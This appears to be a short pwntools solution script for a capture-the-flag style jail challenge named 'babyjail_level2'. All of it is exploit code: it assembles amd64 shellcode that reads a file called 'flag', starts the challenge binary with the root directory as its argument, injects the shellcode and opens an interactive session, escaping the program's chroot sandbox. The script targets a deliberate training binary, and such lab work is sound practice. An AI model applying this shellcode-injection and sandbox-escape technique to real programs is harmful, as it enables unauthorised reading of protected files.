#!/usr/bin/env python3
from pwn import *

elf = ELF("/challenge/babyjail_level2")
context.arch="amd64"

shellcode = asm(shellcraft.readfile("flag", 1))

p = process(["/challenge/babyjail_level2", "/"], cwd="/")
p.sendline(shellcode)
p.interactive()